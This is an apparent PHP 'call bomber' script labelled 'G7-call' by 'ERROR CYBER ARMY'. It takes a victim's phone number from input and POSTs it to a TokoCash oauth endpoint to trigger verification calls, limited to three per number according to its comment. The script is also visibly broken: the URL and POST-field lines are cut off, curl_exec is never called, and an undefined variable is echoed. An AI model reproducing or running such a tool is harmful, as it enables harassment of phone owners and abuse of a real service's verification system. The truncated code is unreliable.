<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth                                                        >
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=ca                                                        >
        curl_close($ch);
                echo $asw."\n";
}
echo "[+]#########################[+]\n";                  
echo "[!] G7-call                 [!]\n";
echo "[!] TEAM ; ERROR CYBER ARMY [!]\n";
echo "[+]#########################[+]\n\n";
echo "[!]Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
